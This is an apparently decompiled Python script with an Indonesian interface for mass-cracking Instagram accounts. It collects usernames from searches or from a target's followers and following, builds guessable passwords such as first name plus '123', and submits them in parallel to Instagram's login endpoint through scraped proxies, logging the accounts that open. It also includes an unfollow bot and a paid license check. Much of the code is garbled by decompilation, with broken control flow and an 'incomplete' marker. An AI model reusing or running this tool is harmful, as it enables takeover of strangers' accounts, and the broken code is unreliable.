# Source Generated with Decompyle++
# File : Madd-KW
# Wkwk Ada Pricode :v

try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request as urllib
    import calendar
finally:
    pass
if ImportError:
    e = None
    
    try:
        exit(f'''\n [\x1b[1;35m>\x1b[0m] module {e} belum terinstall''')
    finally:
        e = None
        del e
    e = None
    del e
    import rich
    import os
    import sys
    import subprocess
    import platform
    import os
    
    try:
        import requests
    finally:
        pass
    if ImportError:
        print('\n [×] Modul requests belum terinstall!...\n')
        os.system('pip install requests')
    else:
        
        try:
            import concurrent.futures as concurrent
        finally:
            pass
        if ImportError:
            print('\n [×] Modul Futures belum terinstall!...\n')
            os.system('pip install futures')
        else:
            
            try:
                import bs4
            finally:
                pass
            if ImportError:
                print('\n [×] Modul Bs4 belum terinstall!...\n')
                os.system('pip install bs4')
            else:
                import requests
                import bs4
                import json
                import os
                import sys
                import random
                import datetime
                import time
                import re
                
                try:
                    import rich
                finally:
                    pass
                if ImportError:
                    os.system('pip install rich')
                    time.sleep(1)
                    
                    try:
                        import rich
                    finally:
                        pass
                    if ImportError:
                        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
                    

                    from rich.table import Table as me
                    from rich.console import Console as sol
                    from bs4 import BeautifulSoup as sop
                    from concurrent.futures import ThreadPoolExecutor as tred
                    from rich.console import Group as gp
                    from rich.panel import Panel as nel
                    from rich import print as cetak
                    from rich.markdown import Markdown as mark
                    from rich.columns import Columns as col
                    from time import sleep
                    from concurrent.futures import ThreadPoolExecutor
                    from datetime import datetime
                    from bs4 import BeautifulSoup as parser
                    import time
                    from rich.panel import Panel
                    from rich.tree import Tree
                    from rich import print as prints
                    from rich import print as printer
                    from rich.console import Console
                    from rich.console import Console as sol
                    from rich.table import Table
                    from rich.columns import Columns
                    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
                    console = Console()
                    day = datetime.now().strftime('%d-%b-%Y')
                    nyMnD = 5
                    nyMxD = 10
                    current_GMT = time.gmtime(time.time())
                    insta_log = 'https://www.instagram.com/accounts/login/?force_classic_login=&'
                    url = 'https://www.instagram.com'
                    menudump = []
                    
                    def folder():
                        
                        try:
                            os.mkdir('result')
                        finally:
                            pass
                        
                        try:
                            os.mkdir('data')
                        finally:
                            return None
                            return None



                    
                    try:
                        prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
                        open('.prox.txt', 'w').write(prox)
                    finally:
                        pass
                    if Exception:
                        e = None
                        
                        try:
                            print('GAGAL')
                        finally:
                            e = None
                            del e
                        e = None
                        del e
                        prox = open('.prox.txt', 'r').read().splitlines()
                        CY = '\x1b[96;1m'
                        H = '\x1b[1;32m'
                        M = '\x1b[1;31m'
                        K = '\x1b[1;33m'
                        U = '\x1b[1;35m'
                        O = '\x1b[38;2;255;127;0;1m'
                        C = '\x1b[0m'
                        N = '\x1b[0m'
                        USN = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)'
                        (internal, external, success, checkpoint, loop, following, lisensikuni, lisensiku) = ([], [], [], [], 0, [], [], [
                            'sukses'])
                        s = requests.Session()
                        
                        def clear():
                            os.system('clear')

                        
                        def waktu():
                            now = datetime.now()
                            hours = now.hour
                            if hours <= hours or hours < 12:
                                timenow = 'Good Morning'
                                return timenow
                            if hours <= hours or hours < 15:
                                timenow = 'Good Afternoon'
                                return timenow
                            if hours <= hours or hours < 18:
                                timenow = 'Good Evening'
                                return timenow
                            timenow = 'Good Night'
                            return timenow

                        
                        def banner():
                            os.system('clear')
                            prints(Panel(' [deep_pink3]\n ___  ________  ___     \n|\\  \\|\\   ____\\|\\  \\    \t[red]██████████████████████[/]   \n\\ \\  \\ \\  \\___|\\ \\  \\   \t[red]██████████████████████[/]\n \\ \\  \\ \\  \\  __\\ \\  \\    \t[white]██████████████████████[/]\n  \\ \\  \\ \\  \\|\\  \\ \\  \\____ \t[white]██████████████████████[/]\n   \\ \\__\\ \\_______\\ \\_______\\\tMade By [red]Indonesia [white]Coder[/]\n   \n[bold green] PENGEMBANGAN : Lukman & Fauzi\n GITHUB       : https://github.com/Fauzi-TOD\n WA           : 083177547834\n TEAM         : Lukman & Fauzi\n                             ', f'''{waktu()}''', '[on cyan] Version 2.3', **('title', 'subtitle')))

                        
                        try:
                            urllib_quote_plus = urllib.quote
                        finally:
                            pass
                        urllib_quote_plus = urllib.parse.quote_plus
                        
                        def cekAPI(cookie):
                            user = open('.username', 'r').read()
                            
                            try:
                                c = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, {
                                    'cookie': cookie }, {
                                    'user-agent': USN,
                                    'x-ig-app-id': '936619743392459' }, **('cookies', 'headers'))
                                i = c.json()['data']['user']
                                nama = i['full_name']
                                followers = i['edge_followed_by']['count']
                                following = i['edge_follow']['count']
                                external.append(f'''{nama}|{followers}|{following}''')
                            finally:
                                return (external, user)
                                if (ValueError, KeyError):
                                    wel = '# Instagram Checkpoint'
                                    wel2 = mark(wel, 'red', **('style',))
                                    sol().print(wel2)
                                    time.sleep(4)
                                    os.remove('.kukis.log')
                                    os.remove('.username')
                                    exit()
                                    return (external, user)


                        
                        def login_kamu():
                            if 'sukses' in lisensiku:
                                
                                try:
                                    kuki = open('.kukis.log', 'r').read()
                                finally:
                                    pass
                                if FileNotFoundError:
                                    banner()
                                    wel = '# Pilih Cara Kamu Login'
                                    wel2 = mark(wel, 'magenta', **('style',))
                                    sol().print(wel2)
                                    io = '[1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
                                    oi = nel(io, 'cyan', **('style',))
                                    cetak(nel(oi, 'Pilih Cara Kamu Login', **('title',)))
                                    loginpil = input(f'''[•] Masukan Pilihan :{C} ''')
                                    if loginpil == '1':
                                        wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                                        wel2 = mark(wel, 'red', **('style',))
                                        sol().print(wel2)
                                        us = input(f'''{CY}[•] Masukan Username :{C}''')
                                        cok = input(f'''{CY}[•] Masukan Cookie :{C}''')
                                        kuki = open('.kukis.log', 'w').write(cok)
                                        user = open('.username', 'w').write(us)
                                        os.system('python run.py')
                                    elif loginpil == '2':
                                        login()
                                    else:
                                        (ex, user) = cekAPI(kuki)
                                        cookie = {
                                            'cookie': kuki }
                                        instagram(ex, user, cookie).menu()
                                        return None
                                    None()
                                    return None


                        
                        def login():
                            
                            try:
                                wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                                wel2 = mark(wel, 'red', **('style',))
                                sol().print(wel2)
                                us = input(f'''{CY}[•] Masukan username: {C}''')
                                pw = stdiomask.getpass(f'''{CY}[•] Masukan password: {C}''', **('prompt',))
                            finally:
                                pass
                            if KeyboardInterrupt:
                                wel = '# KeyboardInterrupt terdeteksi... keluar !'
                                wel2 = mark(wel, 'red', **('style',))
                                sol().print(wel2)
                                exit()
                            else:
                                x = instagramAPI(us, pw).loginAPI()
                                if x.get('status') == 'success':
                                    open('.username', 'a').write(us)
                                    open('.kukis.log', 'a').write(x.get('cookie'))
                                    cookie = {
                                        'cookie': x.get('cookie') }
                                    print(f'''\n{H}>{C} Login berhasil''')
                                    os.system('python run.py')
                                    return None
                                if None.get('status') == 'checkpoint':
                                    wel = '# Login checkpoint'
                                    wel2 = mark(wel, 'red', **('style',))
                                    sol().print(wel2)
                                    login()
                                    return None
                                wel = None
                                wel2 = mark(wel, 'red', **('style',))
                                sol().print(wel2)
                                login()
                                return None


                        
                        class instagram:
                            
                            def __init__(self, external, username, cookie):
                                self.ext = external
                                self.username = username
                                self.cookie = cookie
                                self.s = requests.Session()

                            
                            def logo(self):
                                for i in external:
                                    
                                    try:
                                        nama = i.split('|')[0]
                                        followers = i.split('|')[1]
                                        following = i.split('|')[2]
                                    finally:
                                        pass
                                    banner()
                                    welcome = f'''[{H}•{C}]Selamat Datang : {nama}\n[{H}•{C}]Username       : {self.username}\n[{H}•{C}]Followers      : {followers}\n[{H}•{C}]Following      : {following}'''
                                    print(welcome)
                                    prints(Panel('[[bold green]01[bold cyan]] [bold yellow]Crack Dari Pencarian         [bold cyan][[bold green]02[bold cyan]] [bold yellow]Crack Dari Pengikut\n[bold cyan][[bold green]03[bold cyan]] [bold yellow]Crack dari Mengikuti         [bold cyan][[bold green]04[bold cyan]] [bold yellow]Check Status Crack \n[bold cyan][[bold green]05[bold cyan]] [bold yellow]Lihat Hasil Crack            [bold cyan][[bold green]06[bold cyan]] [bold yellow]Bot Auto Unfollow\n[bold cyan][[bold green]R[bold cyan]] [bold yellow] Laporkan Bug                 [bold cyan][[bold green]C[bold cyan]] [bold yellow]Changelog\n[bold cyan][[bold green]E[bold cyan]] [bold yellow] Exit', 'MENU', **('title',)))
                                    continue
                                    return None


                            
                            def BUG(self):
                                bug = '[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +230 5297 0037\n[•]  𝐸𝑋𝑃𝐿𝑂𝐼𝐷-𝑁𝐼𝑇𝐶𝐻'
                                bug1 = nel(bug, 'magenta', **('style',))
                                cetak(nel(bug1, 'REPORT BUG', **('title',)))
                                exit()

                            
                            def ChangeLog(self):
                                io = '[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
                                oi = nel(io, 'magenta', **('style',))
                                cetak(nel(oi, 'Fitur yang di update', **('title',)))
                                io = '[1] Bot unfollow instagram\n[2] Bot spam komen'
                                oi = nel(io, 'cyan', **('style',))
                                cetak(nel(oi, 'Fitur tambahan', **('title',)))
                                io = '[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
                                oi = nel(io, 'magenta', **('style',))
                                cetak(nel(oi, 'Fix Bug', **('title',)))
                                exit()

                            
                            def Exit(self):
                                kel = '# Apakah anda yakin ingin keluar ?'
                                kel1 = mark(kel, 'red', **('style',))
                                sol().print(kel1)
                                x = input(f'''\n{CY}[•] Jawaban [y/t] : {C}''')
                                if x in ('y', 'Y'):
                                    os.remove('.kukis.log')
                                    os.remove('.username')
                                    os.system('python run.py')
                                    return None
                                if None in ('t', 'T'):
                                    os.system('python run.py')
                                    return None
                                None.Exit()

                            
                            def sixAPI(self, six_id):
                                url = 'https://www.instagram.com/web/search/topsearch/?context=blended&query=' + six_id + '&rank_token=0.3953592318270893&count=1'
                                x = requests.get(url)
                                x_jason = x.json()
                                uid = str(x_jason['users'][0].get('user').get('pk'))
                                return uid

                            
                            def unfollowAPI(self, user_id, username_id, cookie):
                                uuid = generateUUID(True)
                                xx = self.s.get('https://www.instagram.com/', {
                                    'user-agent': User_Agent() }, **('headers',)).content
                                crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(xx))[0]
                                s.headers.update({
                                    'Connection': 'close',
                                    'Accept': '*/*',
                                    'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'Cookie2': '$Version=1',
                                    'Accept-Language': 'en-US',
                                    'User-Agent': User_Agent() })
                                data = json.dumps({
                                    '_uuid': uuid,
                                    '_uid': username_id,
                                    'user_id': user_id,
                                    '_csrftoken': crf_token })
                                self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(self.generateUUID(False), urllib.request.quote(data))
                                return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/' % user_id, self.payload, cookie, **('cookies',)).text

                            
                            def searchAPI(self, cookie, nama):
                                
                                try:
                                    x = s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true' % nama, cookie, {
                                        'user-agent': USN }, **('cookies', 'headers'))
                                    x_jason = json.loads(x.text)
                                finally:
                                    return internal
                                    if requests.exceptions.ConnectionError:
                                        exit(f'''\n [{M}!{C}] Koneksi internet bermasalah''')
                                        return internal


                            
                            def idAPI(self, cookie, id):
                                if 'sukses' in lisensiku:
                                    
                                    try:
                                        m = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % id, cookie, {
                                            'user-agent': USN,
                                            'x-ig-app-id': '936619743392459' }, **('cookies', 'headers'))
                                        m_jason = m.json()['data']['user']
                                        idx = m_jason['id']
                                    finally:
                                        return idx
                                        if requests.exceptions.ConnectionError:
                                            exit(f'''\n{M}┣[!] Koneksi internet bermasalah{C}''')
                                            return idx
                                        if Exception:
                                            e = None
                                            
                                            try:
                                                exit(f'''\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}''')
                                            finally:
                                                e = None
                                                del e
                                                return idx
                                                e = None
                                                del e
                                                lisensi()
                                                return None



                            
                            def infoAPI(self, cookie, api, id):
                                if 'sukses' in lisensiku:
                                    
                                    try:
                                        idtar = '# [•] TUNGGU SEDANG MENGUMPULKAN ID [•]'
                                        idtar1 = mark(idtar, 'yellow', **('style',))
                                        sol().print(idtar1)
                                        x = s.get(api % id, cookie, {
                                            'user-agent': USN }, **('cookies', 'headers'))
                                        x_jason = json.loads(x.text)
                                        if 'pengikut' in menudump:
                                            maxid = x_jason['next_max_id']
                                            for z in range(9999):
                                                x = s.get('https://i.instagram.com/api/v1/friendships/' + id + '/followers/?count=100&max_id=' + maxid, cookie, {
                                                    'user-agent': USN }, **('cookies', 'headers'))
                                                x_jason = json.loads(x.text)
                                                
                                                try:
                                                    
                                                    try:
                                                        maxid = x_jason['next_max_id']
                                                    finally:
                                                        pass
                                                    [ f'''{username}|{nama}''' ]
                                                    [ username for i in x_jason['users'] ]
                                                    [ f'''{username}|{nama}''' ]
                                                    continue
                                                    if 'challenge' in x.text:
                                                        pass
                                                    return internal
                                                    return internal
                                                    return internal
                                                    return internal
                                                    if requests.exceptions.ConnectionError:
                                                        exit(f'''\n{M}┣[!] Koneksi internet bermasalah{C}''')
                                                        return internal
                                                    if Exception:
                                                        e = None
                                                        
                                                        try:
                                                            print(f'''\n{M}┣[!] Username yang anda masukan tidak di temukan{C}''')
                                                        finally:
                                                            e = None
                                                            del e
                                                            return internal
                                                            e = None
                                                            del e
                                                            lisensi()
                                                            return None





                            
                            def passwordAPI(self, xnx):
                                idtar = f'''# [•] TOTAL ID  : {len(internal)} [•]'''
                                idtar1 = mark(idtar, 'yellow', **('style',))
                                sol().print(idtar1)
                                pilpass = '# Pilihan Kombinasi Password'
                                pilpass1 = mark(pilpass, 'green', **('style',))
                                sol().print(pilpass1)
                                komb = '[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name\n[4] Password Manual'
                                komb1 = nel(komb, 'cyan', **('style',))
                                cetak(nel(komb1))
                                c = input(f'''{CY}[•] Masukan Pilihan :{C} ''')
                                if c == '1':
                                    self.generateAPI(xnx, c)
                                    return None
                                if None == '2':
                                    self.generateAPI(xnx, c)
                                    return None
                                if None == '3':
                                    self.generateAPI(xnx, c)
                                    return None
                                if None == '7':
                                    self.generateAPI(xnx, c)
                                    return None
                                if None == '4':
                                    ui = '# PASSWORD MANUAL'
                                    uu = mark(ui, '', **('style',))
                                    sol().print(uu)
                                    print(f'''{M} Contoh sayang,anjing,bangsat''')
                                    print('')
                                    zx = input(f'''{CY}[•] List password :{C} ''')
                                    self.generateAPI(xnx, c, zx)
                                    return None
                                None.passwordAPI(xnx)

                            
                            def generateAPI(self, user, o, zx = ('',)):
                                io = f'''[•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'''
                                oi = nel(io, 'cyan', **('style',))
                                cetak(nel(oi, 'CRACK DIMULAI', **('title',)))
                                ipku = '# [•] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detik'
                                ipku1 = mark(ipku, 'red', **('style',))
                                sol().print(ipku1)
                                with ThreadPoolExecutor(15, **('max_workers',)) as shinkai:
                                    for i in user:
                                        
                                        try:
                                            username = i.split('|')[0]
                                            password = i.split('|')[1].lower()
                                            w = w.lower()
                                            if o == '1':
                                                if len(w) == 3 and len(w) == 4 or len(w) == 5:
                                                    sandi = [
                                                        w + '123',
                                                        w + '1234']
                                                else:
                                                    sandi = [
                                                        w]
                                            elif o == '2':
                                                if len(w) == 3 and len(w) == 4 or len(w) == 5:
                                                    sandi = [
                                                        w + '123',
                                                        w,
                                                        w + '1234',
                                                        w + '12345']
                                                else:
                                                    sandi = [
                                                        w + '123',
                                                        w,
                                                        w + '1234',
                                                        w + '12345']
                                            elif o == '3':
                                                if len(w) == 3 and len(w) == 4 or len(w) == 5:
                                                    sandi = [
                                                        w + '123',
                                                        w,
                                                        password.lower()]
                                                else:
                                                    sandi = [
                                                        w + '123',
                                                        w,
                                                        password.lower()]
                                            elif o == '7':
                                                if len(w) == 3 and len(w) == 4 or len(w) == 5:
                                                    sandi = [
                                                        w + '123',
                                                        w + '1234',
                                                        w + '12345',
                                                        w]
                                                else:
                                                    sandi = [
                                                        w + '123',
                                                        w + '1234',
                                                        w + '12345',
                                                        password.lower()]
                                            elif o == '4':
                                                if len(zx) > 3:
                                                    sandi = zx.replace(' ', '').split(',')
                                                
                                            else:
                                                shinkai.submit(self.crackAPI, username, sandi)
                                        finally:
                                            continue
                                            continue
                                            None(None, None, None)
                                        if not None:
                                            print('\n')
                                            oi = '# CRACK SELESAI'
                                            io = mark(oi, 'yellow', **('style',))
                                            sol().print(io)
                                            exit()
                                            return None


                            
                            def APIinfo(self, user):
                                
                                try:
                                    x = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, {
                                        'user-agent': USN,
                                        'x-ig-app-id': '936619743392459' }, **('headers',))
                                    x_jason = x.json()['data']['user']
                                    nama = x_jason['full_name']
                                    pengikut = x_jason['edge_followed_by']['count']
                                    mengikut = x_jason['edge_follow']['count']
                                    postingan = x_jason['edge_owner_to_timeline_media']['count']
                                finally:
                                    pass
                                return (nama, pengikut, mengikut, postingan)


                            
                            def crackAPI(self, user, pas):
                                (sys.stdout.write(f'''\r{CY}┣[IGL] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} '''), sys.stdout.flush())
                            # WARNING: Decompyle incomplete

                            
                            def checkAPI(self, user, pw):
                                
                                try:
                                    token = s.get('https://www.instagram.com/', {
                                        'user-agent': User_Agent() }, **('headers',)).content
                                    crf_token = re.findall('\\"csrf_token\\"\\:\\"(.*?)\\"', str(token))[0]
                                    s.headers.update({
                                        'authority': 'www.instagram.com',
                                        'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                                        'x-instagram-ajax': '82a581bb9399',
                                        'content-type': 'application/x-www-form-urlencoded',
                                        'accept': '*/*',
                                        'user-agent': user_agent(),
                                        'x-requested-with': 'XMLHttpRequest',
                                        'x-csrftoken': crf_token,
                                        'x-ig-app-id': '936619743392459',
                                        'origin': 'https://www.instagram.com',
                                        'sec-fetch-site': 'same-origin',
                                        'sec-fetch-mode': 'cors',
                                        'sec-fetch-dest': 'empty',
                                        'referer': 'https://www.instagram.com/',
                                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                                    param = {
                                        'username': user,
                                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(random.randint(1000000000, 0x174876E7FFL), pw),
                                        'optIntoOneTap': False,
                                        'queryParams': { },
                                        'stopDeletionNonce': '',
                                        'trustedDeviceRecords': { } }
                                    x = s.post('https://www.instagram.com/accounts/login/ajax/', param, **('data',))
                                    sleep(1)
                                    x_jason = json.loads(x.text)
                                    if 'userId' in x.text:
                                        (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                                        io = f'''Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'''
                                        oi = nel(io, 'green', **('style',))
                                        print('\n')
                                        cetak(nel(oi, ' LIVE', **('title',)))
                                finally:
                                    return None
                                    if 'checkpoint_url' in x.text:
                                        (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                                        io = f'''Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'''
                                        oi = nel(io, 'yellow', **('style',))
                                        print('\n')
                                        cetak(nel(oi, ' CHECKPOINT', **('title',)))
                                    return None
                                    if 'Please wait a few minutes' in str(x.text):
                                        sys.stdout.write(f'''\r {U}!{C}] {U}Please wait a few minutes second{C}''')
                                        sys.stdout.flush()
                                        sleep(10)
                                        self.checkAPI(user, pw)
                                    return None
                                    return None
                                    self.checkAPI(user, pw)
                                    return None


                            
                            def menu(self):
                                self.logo()
                                c = input(f''' {CY}[PILIH] :{C}  ''')
                                if c == '':
                                    self.menu()
                                    return None
                                if None in ('1', '01'):
                                    mas = '# Masukan jumlah target'
                                    mas1 = mark(mas, 'green', **('style',))
                                    sol().print(mas1)
                                    m = int(input(f'''\n{CY}[•] Jumlah : {C}'''))
                                print('')
                                mas = '# Masukan nama ranfom untuk di searching'
                                mas1 = mark(mas, 'green', **('style',))
                                sol().print(mas1)
                                self.passwordAPI(name)
                                return None
                                if c in ('2', '02'):
                                    pr = '# PASTIKAN TARGET BERSIFAT PUBLIK'
                                    po = mark(pr, 'red', **('style',))
                                    sol().print(po)
                                    mas = input('Apakah anda ingin crack masal? y/t >  ')
                                    if mas in ('y', 'Y'):
                                        masal(self)
                                        return None
                                    if None in ('t', 'T'):
                                        massal(self)
                                        return None
                                    if None in ('',):
                                        print('ISI JANGAN KOSONG KENTOD!')
                                        return None
                                    return None
                                if None in ('3', '03'):
                                    pr = '# PASTIKAN TARGET BERSIFAT PUBLIK'
                                    po = mark(pr, 'red', **('style',))
                                    sol().print(po)
                                    mas = input('Apakah anda ingin crack masal? y/t >  ')
                                    if mas in ('y', 'Y'):
                                        mengi(self)
                                        return None
                                    if None in ('t', 'T'):
                                        meng(self)
                                        return None
                                    if None in ('',):
                                        print('ISI JANGAN KOSONG KENTOD!')
                                        return None
                                    return None
                                if None in ('4', '04'):
                                    print('')
                                    c = input(f'''\n {CY}┣>>> Masukan nama file: {C}''')
                                    g = open('result/%s' % c).read().splitlines()
                                    print(f'''\n{CY}┣[+] Total Result MASTER_FU{H}{len(g)}{C}''')
                                    print(f'''\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n''')
                                    exit(f'''\n\n{K}┣[#] proses check selesai...{C}''')
                                    return None
                                if None in ('5', '05'):
                                    print('')
                                    c = input(f'''\n {U}┣>>> Masukan nama file: {C}''')
                                    g = open('result/%s' % c).read().splitlines()
                                    xx = c.split('-')
                                    xc = xx[0]
                                    print(f'''\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]''')
                                    []['\n  '][f'''{H}''']['╔══[ '][f'''{C}'''][f'''{H}'''][' LUKMAN-XD :  OK '][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Username : '][f'''{H}'''][f'''{usr}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Password : '][f'''{H}'''][f'''{pwd}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Pengikut : '][f'''{H}'''][f'''{fol}'''][f'''{C}''']['\n  '][f'''{H}''']['╚══[ '][f'''{C}'''][f'''{H}'''][' Mengikuti : '][f'''{H}'''][f'''{ful}''']([]['\n  '][f'''{H}''']['╔══[ '][f'''{C}'''][f'''{H}'''][' LUKMAN-XD :  OK '][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Username : '][f'''{H}'''][f'''{usr}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Password : '][f'''{H}'''][f'''{pwd}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Pengikut : '][f'''{H}'''][f'''{fol}'''][f'''{C}''']['\n  '][f'''{H}''']['╚══[ '][f'''{C}'''][f'''{H}'''][' Mengikuti : '][f'''{H}'''][f'''{ful}'''][f'''{C}''']([]['\n  '][f'''{H}''']['╔══[ '][f'''{C}'''][f'''{H}'''][' LUKMAN-XD :  OK '][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Username : '][f'''{H}'''][f'''{usr}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Password : '][f'''{H}'''][f'''{pwd}'''][f'''{C}''']['\n  '][f'''{H}''']['║══[ '][f'''{C}'''][f'''{H}'''][' Pengikut : '][f'''{H}'''][f'''{fol}'''][f'''{C}''']['\n  '][f'''{H}''']['╚══[ '][f'''{C}'''][f'''{H}'''][' Mengikuti : '][f'''{H}'''][f'''{ful}'''][f'''{C}''']['\n                    ']))
                                    sleep(0.05)
                                    continue
                                    return None
                                if None in ('6', '06'):
                                    six = 0
                                    print(f'''\n [{U}!{C}] Bot Unfollow-All Dijalankan\n''')
                                    x = open('.kukis.log', 'r').read()
                                    x_id = re.findall('sessionid=(\\d+)', x)[0]
                                    back = self.infoAPI(self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', x_id)
                                    input(f'''\n\n [{U}#{C}] Unfollow-all selesai...''')
                                    self.menu()
                                    return None
                                if None in ('r', 'R'):
                                    self.BUG()
                                    return None
                                if None in ('c', 'C'):
                                    self.ChangeLog()
                                    return None
                                if None in ('e', 'E'):
                                    self.Exit()
                                    return None
                                None.menu()


                        
                        def tlisensi():
                            banner()
                            wel = '# LICENSE IS NOT APPLICABLE OR WRONG'
                            wel2 = mark(wel, 'red', **('style',))
                            sol().print(wel2)
                            time.sleep(2)
                            prints(Panel(f'''{N}[{H}01{H}]. I have apikey and want to enter it\n[{N}02{N}]. I don\'t have Apikey and want to buy''', 80, (0, 15), 'green', **('width', 'padding', 'style')))
                            api = input(f''' {N}input choice : ''')
                            if api in ('1', '01'):
                                prints(Panel(f'''{H}enter the apikey you have, if not, please buy by selecting number 2''', 80, 'green', **('width', 'style')))
                                key = input(f''' {N}input apikey : {H}''')
                                open('data/lisen.txt', 'w').write(key)
                                lisensi()
                                return None
                            if None in ('2', '02'):
                                os.system('xdg-open https://wa.me/6283177547834?text=assalamualaikum,+bang+me+want+buy+license')
                                sleep(2)
                                tlisensi()
                                return None
                            None()

                        
                        def lisensi():
                            
                            try:
                                cek = open('data/lisen.txt').read()
                                lisensikuni.append(cek)
                            finally:
                                pass
                            tlisensi()
                            ses = requests.Session()
                            res = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMjk4NTM5MCIsIjZKVndkSkdKaGVMd1NUYjlqeldnMVpEVjdGelZMZVUwdmhtY1JDeU0iXQ==&ProductId=15942&Key=' + lisensikuni[0]).json()
                            status = res['licenseKey']['key']
                            if status == cek:
                                banner()
                                wel = '# LICENSE APPLICABLE '
                                wel2 = mark(wel, 'green', **('style',))
                                sol().print(wel2)
                                time.sleep(2)
                                lisensiku.append('sukses')
                                login_kamu()
                                return None
                            None()
                            return None


                        
                        def mengi(self):
                            
                            try:
                                menudump.append('pengikut')
                                mas = '# Target harus bersifat publik jangan privat'
                                mas1 = mark(mas, 'red', **('style',))
                                sol().print(mas1)
                                m = int(input(f'''\n{H}[?{H}] Masukan jumlah target: {N}'''))
                            finally:
                                pass
                            m = 1
                            self.passwordAPI(info)
                            return None


                        
                        def meng(self):
                            mas = '# Target harus bersifat publik jangan privat'
                            mas1 = mark(mas, 'red', **('style',))
                            sol().print(mas1)
                            m = input(f'''{CY}[•] Username target : {C}''')
                            id = self.idAPI(self.cookie, m)
                            info = self.infoAPI(self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
                            self.passwordAPI(info)

                        
                        def masal(self):
                            
                            try:
                                menudump.append('pengikut')
                                mas = '# Target harus bersifat publik jangan privat'
                                mas1 = mark(mas, 'red', **('style',))
                                sol().print(mas1)
                                m = int(input(f'''\n{H}[?{H}] Masukan jumlah target: {N}'''))
                            finally:
                                pass
                            m = 1
                            self.passwordAPI(info)
                            return None


                        
                        def massal(self):
                            menudump.append('pengikut')
                            mas = '# Target harus bersifat publik jangan privat'
                            mas1 = mark(mas, 'red', **('style',))
                            sol().print(mas1)
                            m = input(f'''{CY}[•] Username target : {C}''')
                            id = self.idAPI(self.cookie, m)
                            info = self.infoAPI(self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000', id)
                            self.passwordAPI(info)

                        if __name__ == '__main__':
                            
                            try:
                                lisensi()
                            finally:
                                return None
                                if requests.exceptions.ConnectionError:
                                    exit(f'''\n [{M}!{C}] Koneksi internet bermasalah''')
                                    return None
                                return None

#Terkadang...